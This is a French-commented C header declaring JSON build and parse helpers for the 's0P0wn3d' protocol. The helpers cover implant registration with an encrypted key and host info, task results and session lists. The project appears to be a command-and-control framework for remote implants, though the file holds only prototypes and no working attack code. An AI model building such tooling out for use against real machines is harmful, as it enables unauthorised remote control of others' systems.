/*
 * s0P0wn3d — Helpers JSON minimaux.
 *
 * Fonctions utilitaires pour construire et parser des chaînes JSON
 * simples adaptées au protocole s0P0wn3d. Pas un parser JSON complet —
 * suffisant pour les messages du protocole.
 */

#ifndef S0P_JSON_H
#define S0P_JSON_H

#include "protocol.h"

/* ─── Construction de JSON ────────────────────────────────────────────────── */

/* Construit un JSON d'enregistrement d'implant.
 * Retourne une chaîne malloc-ée (l'appelant doit free()). */
char *json_build_register(const char *encrypted_key_b64,
                          const host_info_t *host);

/* Construit un JSON de résultat de tâche (pour envoi).
 * Retourne une chaîne malloc-ée. */
char *json_build_result(const task_result_t *result);

/* Construit un JSON d'accusé de réception. */
char *json_build_ack(void);

/* Construit un JSON listant les sessions. */
char *json_build_sessions(const session_t *sessions, int count);

/* ─── Parsing de JSON ──────────────────────────────────────────────────────── */

/* Extrait la valeur d'une clé string d'un JSON simple.
 * Retourne une chaîne malloc-ée ou NULL si non trouvée. */
char *json_extract_string(const char *json, const char *key);

/* Extrait la valeur d'une clé dans un objet imbriqué simple. */
char *json_extract_nested(const char *json, const char *parent_key,
                         const char *child_key);

/* Parse un message de tâche déchiffré.
 * Retourne 0 en cas de succès, -1 en cas d'erreur. */
int json_parse_task(const char *json, task_t *task);

/* Parse un résultat de tâche déchiffré.
 * Retourne 0 en cas de succès, -1 en cas d'erreur. */
int json_parse_result(const char *json, task_result_t *result);

/* Parse une liste de tâches (message {"type":"tasks","tasks":[...]}).
 * Remplit le tableau tasks et retourne le nombre de tâches. */
int json_parse_tasks(const char *json, task_t *tasks, int max);

#endif /* S0P_JSON_H */
